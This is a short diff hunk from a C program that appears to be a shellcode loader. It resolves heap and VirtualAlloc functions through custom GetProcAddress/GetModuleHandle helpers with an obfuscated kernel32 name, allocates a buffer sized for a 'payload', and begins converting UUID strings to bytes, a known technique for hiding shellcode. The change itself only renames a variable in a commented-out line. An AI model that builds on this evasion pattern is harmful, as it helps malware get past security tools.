@@ -113,7 +113,7 @@ int main() {
     HANDLE ha = pHeapAlloc(hc, HEAP_ZERO_MEMORY, payload_size);
 
     //tVirtualAlloc pVirtualAlloc = (tVirtualAlloc)hlpGetProcAddress(hlpGetModuleHandle(&sKernel32[0]), (char *) sVirtualAlloc);
-    //HANDLE hc = pVirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    //HANDLE ha = pVirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 
     // Converting Uuids to bytes
